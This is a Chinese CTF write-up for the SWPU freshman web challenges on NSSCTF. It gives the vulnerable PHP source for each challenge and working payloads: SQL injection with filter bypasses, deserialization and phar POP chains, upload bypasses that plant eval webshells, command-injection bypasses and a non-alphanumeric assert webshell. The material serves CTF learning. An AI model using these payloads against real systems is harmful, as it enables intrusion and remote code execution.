---
title: nssctf-SWPU新生赛web部分
id: nssctf-SWPU新生赛web部分
date: 2021-10-11 12:40:30

---

<!-- more -->

和群里一师傅交流的时候，就好奇问了一句是哪的题

但是一开始做错赛场了，跑人家校内赛场打了hh，还收到招新邮件，虽然也礼貌回信解释了
但还是给人家的招新添加了麻烦，下次要注意

新手向，由易到难，有些题目也很有意思

本来没想着写wp的，后面想想怕忘了一些知识点还是写一下

![](https://i.loli.net/2021/10/20/KSxg38sIOyJ9Buk.png)

简单分了一下类

## basic

### gift_F12

f12

![](https://i.loli.net/2021/10/11/HINpzuBai39sloX.png)

### jicao

```php
<?php
highlight_file('index.php');
include("flag.php");
$id=$_POST['id'];
$json=json_decode($_GET['json'],true);
if ($id=="wllmNB"&&$json['x']=="wllm")
{echo $flag;}
?>
```

考传参，get、post，还有json

![](https://i.loli.net/2021/10/11/4Ii9gfjDTyuPWvA.png)



### Do_you_know_http

这题我很像吐槽--，先是在hello.php判断user-agent，然后他会跳转到a.php判断xff，如果没注意看url就会整不出。。

![](https://i.loli.net/2021/10/11/AgMTtwJ6PGqKlSF.png)

### easy_md5

```php
<?php 
 highlight_file(__FILE__);
 include 'flag2.php';
 
if (isset($_GET['name']) && isset($_POST['password'])){
    $name = $_GET['name'];
    $password = $_POST['password'];
    if ($name != $password && md5($name) == md5($password)){
        echo $flag;
    }
    else {
        echo "wrong!";
    }
 
}
else {
    echo 'wrong!';
}
?>
```

数组绕就行

![](https://i.loli.net/2021/10/11/wPQvyOBFfnT1k9x.png)

## 伪协议

### include

```php
<?php
ini_set("allow_url_include","on");
header("Content-type: text/html; charset=utf-8");
error_reporting(0);
$file=$_GET['file'];
if(isset($file)){
    show_source(__FILE__);
    echo 'flag 在flag.php中';
}else{
    echo "传入一个file试试";
}
echo "</br>";
echo "</br>";
echo "</br>";
echo "</br>";
echo "</br>";
include_once($file);
?> flag 在flag.php中

```

伪协议读一下

```
?file=php://filter/convert.base64-encode/resource=flag.php
```

![](https://i.loli.net/2021/10/11/6pq1AT42XvWVUgh.png)



### PseudoProtocols

伪协议读hint.php

![](https://i.loli.net/2021/10/11/OxJs5giK6zCTfnM.png)

```php
<?php
ini_set("max_execution_time", "180");
show_source(__FILE__);
include('flag.php');
$a= $_GET["a"];
if(isset($a)&&(file_get_contents($a,'r')) === 'I want flag'){
    echo "success\n";
    echo $flag;
}
?>
```

data伪协议绕过file_get_content

```
/test2222222222222.php?a=data://text/plain,I want flag
```



## sql

### easy_sql

```
-1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() %23
```

```
-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name="test_tb" %23
```

```
-1'union select 1,2,flag from test_tb %23
```

![](https://i.loli.net/2021/10/11/BXi6Qrb5LVc2zKw.png)

### error

还是sql注入，报错注入

```
<!--SELECT * FROM users WHERE id='$id' LIMIT 0,1-->
```

```
1' and (select updatexml(1,concat(0x7e,(select database()),0x7e),1))--+
```

```
1' and (select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1))--+
```

```
1' and (select updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name="test_tb"),0x7e),1))--+
```

```
正常读只能出一半，加个substr

1' and (select updatexml(1,concat(0x7e,(select substr(flag,1,20) from test_tb),0x7e),1))--+

1' and (select updatexml(1,concat(0x7e,(select substr(flag,20,40) from test_tb),0x7e),1))--+
```



### sql

过滤了空格，用/**/绕过

```
-1'union/**/select/**/1,2,database()%23
```

过滤了or,information用不了，改用InnoDB

过滤了=,改用like

```
-1'union/**/select/**/1,2,group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name/**/like/**/database()%23
```

得到表名`LTLT_flag`

然后无列名注入

```
-1'union/**/select/**/1,2,group_concat(`2`)/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/LTLT_flag)x%23
```

substr被ban了，用mid

```
-1'union/**/select/**/1,2,group_concat(mid(`2`,20,40))/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/LTLT_flag)x%23
```



## 反序列化

### ez_unserialize

f12给了robots.txt的内容格式

查看robots.txt得到关键文件`cl45s.php`

```php
# cl45s.php
<?php

error_reporting(0);
show_source("cl45s.php");

class wllm{

    public $admin;
    public $passwd;

    public function __construct(){
        $this->admin ="user";
        $this->passwd = "123456";
    }

        public function __destruct(){
        if($this->admin === "admin" && $this->passwd === "ctf"){
            include("flag.php");
            echo $flag;
        }else{
            echo $this->admin;
            echo $this->passwd;
            echo "Just a bit more!";
        }
    }
}

$p = $_GET['p'];
unserialize($p);

?>
```

poc

```php
<?php

class wllm{

    public $admin="admin";
    public $passwd="ctf";
}

$a = new wllm();
echo serialize($a);

#
O:4:"wllm":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:3:"ctf";}
```







### no_wakeup

```php
<?php

header("Content-type:text/html;charset=utf-8");
error_reporting(0);
show_source("class.php");

class HaHaHa{


        public $admin;
        public $passwd;

        public function __construct(){
            $this->admin ="user";
            $this->passwd = "123456";
        }

        public function __wakeup(){
            $this->passwd = sha1($this->passwd);
        }

        public function __destruct(){
            if($this->admin === "admin" && $this->passwd === "wllm"){
                include("flag.php");
                echo $flag;
            }else{
                echo $this->passwd;
                echo "No wake up";
            }
        }
    }

$Letmeseesee = $_GET['p'];
unserialize($Letmeseesee);

?>
```

绕过__wakeup

```php
<?php

class HaHaHa{
    public $admin = "admin";
    public $passwd = "wllm";
}

$a = new HaHaHa();
echo serialize($a);
```

把属性数目改一下

```
O:6:"HaHaHa":3:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}
```



### pop

```php
<?php

error_reporting(0);
show_source("index.php");

class w44m{

    private $admin = 'aaa';
    protected $passwd = '123456';

    public function Getflag(){
        if($this->admin === 'w44m' && $this->passwd ==='08067'){
            include('flag.php');
            echo $flag;
        }else{
            echo $this->admin;
            echo $this->passwd;
            echo 'nono';
        }
    }
}

class w22m{
    public $w00m;
    public function __destruct(){
        echo $this->w00m;
    }
}

class w33m{
    public $w00m;
    public $w22m;
    public function __toString(){
        $this->w00m->{$this->w22m}();
        return 0;
    }
}

$w00m = $_GET['w00m'];
unserialize($w00m);

?>
```

简单的pop链

w22m _destruct =》w33m _toString =》w44m Getflag

poc：

```php
<?php

class w44m{
    private $admin = 'w44m';
    protected $passwd = '08067';
}

class w22m{
    public $w00m;
    public function __construct(){
        $this->w00m = new w33m();
    }
}

class w33m{
    public $w00m;
    public $w22m;
    public function __construct(){
        $this->w00m = new w44m();
        $this->w22m = "Getflag";
    }
}


$a = new w22m();
echo urlencode(serialize($a));
```

private属性存在不可见字符，urlencode一下传入即可，浏览器会自己urldecode



### babyunser

phar反序列化

在read.php可以读源码

```php
# upload.php

<?php
    if(isset($_POST['submit'])){
        $upload_path="upload/".md5(time()).".txt";
        $temp_file = $_FILES['upload_file']['tmp_name'];
        if (move_uploaded_file($temp_file, $upload_path)) {
            echo "文件路径：".$upload_path;
        } else {
            $msg = '上传失败';
        }
    }

```

```php
# read.php
<?php
error_reporting(0);
$filename=$_POST['file'];
if(!isset($filename)){
    die();
}
$file=new zz($filename);
$contents=$file->getFile();
?>
<br>
<textarea class="file_content" type="text" value=<?php echo "<br>".$contents;?>
```

```php
# class.php
<?php
class aa{
    public $name;

    public function __construct(){
        $this->name='aa';
    }

    public function __destruct(){
        $this->name=strtolower($this->name);
    }
}

class ff{
    private $content;
    public $func;

    public function __construct(){
        $this->content="\<?php @eval(\$_POST[1]);?>";
    }

    public function __get($key){
        $this->$key->{$this->func}($_POST['cmd']);
    }
}

class zz{
    public $filename;
    public $content='surprise';

    public function __construct($filename){
        $this->filename=$filename;
    }

    public function filter(){
        if(preg_match('/^\/|php:|data|zip|\.\.\//i',$this->filename)){
            die('这不合理');
        }
    }

    public function write($var){
        $filename=$this->filename;
        $lt=$this->filename->$var;
        //此功能废弃，不想写了
    }

    public function getFile(){
        $this->filter();
        $contents=file_get_contents($this->filename);
        if(!empty($contents)){
            return $contents;
        }else{
            die("404 not found");
        }
    }

    public function __toString(){
        $this->{$_POST['method']}($_POST['var']);
        return $this->content;
    }
}

class xx{
    public $name;
    public $arg;

    public function __construct(){
        $this->name='eval';
        $this->arg='phpinfo();';
    }

    public function __call($name,$arg){
        $name($arg[0]);
    }
}
```

poc

[利用 phar 拓展 php 反序列化漏洞攻击面 (seebug.org)](https://paper.seebug.org/680/#22-demo)

```php
<?php
class aa{
    public $name;
    function __construct(){
        $this->name = new zz();
    }
}

class ff{
    private $content;
    public $func = "assert";
    function __construct(){
        $this->content = new xx();
    }
}

class zz{
    public $filename;
    public $content='surprise';
    function __construct(){
        $this->filename = new ff();
    }

}

class xx{
    public $name;
    public $arg;
}

$a = new aa();
echo urlencode(serialize($a));

# 下面这部分就没改
$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub

$phar->setMetadata($a); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
```

把生成的phar文件上传上去

再到read.php利用file_get_content+phar://触发反序列化

![](https://i.loli.net/2021/10/11/vmsXcZgrhJe4Vlj.png)





## upload

### easyupload1.0

检查Content-Type,bp抓包改一下即可

![](https://i.loli.net/2021/10/11/ufXbvCpd5mqgB1G.png)

这个是假的，真的flag在phpinfo--

![](https://i.loli.net/2021/10/11/8jdABnDgL6vwqUF.png)



### easyupload2.0

在1.0基础上，文件名过滤了php

改用phtml

![](https://i.loli.net/2021/10/11/ibsL7Yv8mtDVdTo.png)

### easyupload3.0

配合`.htaccess`

```
<FilesMatch "shell">
    SetHandler application/x-httpd-php
</FilesMatch>
```

再传个名为shell的马就行，

文件格式无所谓，因为都会被当成php解析

![](https://i.loli.net/2021/10/11/z3xOk6l2pvWeQrS.png)











## rce

### caidao

```php
@eval($_POST['wllm']);
```

![](https://i.loli.net/2021/10/11/cnZ1gbomPrEpOyH.png)

### easyrce

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['url']))
{
eval($_GET['url']);
}
?>
```

本来以为会ban掉一些函数，看了一下phpinfo发现没有

直接`?url=system("cat /flllllaaaaaaggggggg");`



### babyrce

```php
<?php
error_reporting(0);
header("Content-Type:text/html;charset=utf-8");
highlight_file(__FILE__);
if($_COOKIE['admin']==1) 
{
    include "../next.php";
}
else
    echo "小饼干最好吃啦！";
?> 小饼干最好吃啦！
```

cookie传值admin=1，得到关键文件`rasalghul.php`，访问之

```php
# rasalghul.php
<?php
error_reporting(0);
highlight_file(__FILE__);
error_reporting(0);
if (isset($_GET['url'])) {
  $ip=$_GET['url'];
  if(preg_match("/ /", $ip)){
      die('nonono');
  }
  $a = shell_exec($ip);
  echo $a;
}
?>
```

过滤了空格，用%09（tab）

```
url=cat%09/flllllaaaaaaggggggg
```

### finalrce

```php
<?php
highlight_file(__FILE__);
if(isset($_GET['url']))
{
    $url=$_GET['url'];
    if(preg_match('/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\"|\>|\<|\%|\$/i',$url))
    {
        echo "Sorry,you can't use this.";
    }
    else
    {
        echo "Can you see anything?";
        exec($url);
    }
}
```

过滤了很多，这题比较有意思

单引号绕过关键词过滤，用`|`和`tee`把命令执行结果传入txt文件里，再访问查看

cat flag的时候发现不行，原来是过滤了la
用占位符`?`来替代一位即可

payload：

```
?url=l''s / | tee a.txt
```

![](https://i.loli.net/2021/10/11/cMQYOZh1AbKtzqd.png)

```
?url=ca''t /flllll?aaaaaggggggg | tee a.txt
```

![](https://i.loli.net/2021/10/11/ESqX8z2WPLZUIhl.png)



### hardrce

```php
<?php
header("Content-Type:text/html;charset=utf-8");
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['wllm']))
{
    $wllm = $_GET['wllm'];
    $blacklist = [' ','\t','\r','\n','\+','\[','\^','\]','\"','\-','\$','\*','\?','\<','\>','\=','\`',];
    foreach ($blacklist as $blackitem)
    {
        if (preg_match('/' . $blackitem . '/m', $wllm)) {
        die("LTLT说不能用这些奇奇怪怪的符号哦！");
    }}
if(preg_match('/[a-zA-Z]/is',$wllm))
{
    die("Ra's Al Ghul说不能用字母哦！");
}
echo "NoVic4说：不错哦小伙子，可你能拿到flag吗？";
eval($wllm);
}
else
{
    echo "蔡总说：注意审题！！！";
}
?>
```

无字母数字rce，可以用yu师傅的脚本直接生成payload--

[无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）_羽的博客-CSDN博客](https://blog.csdn.net/miuzzx/article/details/109143413)

这里用取反

```php
<?php
//在命令行中运行

/*author yu22x*/

fwrite(STDOUT,'[+]your function: ');

$system=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN)); 

fwrite(STDOUT,'[+]your command: ');

$command=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN)); 

echo '[*] (~'.urlencode(~$system).')(~'.urlencode(~$command).');';
```

![](https://i.loli.net/2021/10/11/YNTGueWQ86dShrC.png)

![](https://i.loli.net/2021/10/11/MgZ4BurmOyKPHcG.png)

### hardrce_3

```php
<?php
header("Content-Type:text/html;charset=utf-8");
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['wllm']))
{
    $wllm = $_GET['wllm'];
    $blacklist = [' ','\^','\~','\|'];
    foreach ($blacklist as $blackitem)
    {
        if (preg_match('/' . $blackitem . '/m', $wllm)) {
        die("小伙子只会异或和取反？不好意思哦LTLT说不能用！！");
    }}
if(preg_match('/[a-zA-Z0-9]/is',$wllm))
{
    die("Ra'sAlGhul说用字母数字是没有灵魂的！");
}
echo "NoVic4说：不错哦小伙子，可你能拿到flag吗？";
eval($wllm);
}
else
{
    echo "蔡总说：注意审题！！！";
}
?> 
```

[无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）_羽的博客-CSDN博客](https://blog.csdn.net/miuzzx/article/details/109143413)

自增：

```
//测试发现7.0.12以上版本不可使用
//使用时需要url编码下
$_=[];$_=@"$_";$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);
固定格式 构造出来的 assert($_POST[_]);
然后post传入   _=phpinfo();

```

但是ban了很多函数

可以伪协议读文件，但不知道咋看文件内容--

直接哥斯拉连一下就行

![](https://i.loli.net/2021/10/11/5cCsF8WuzXy4oSq.png)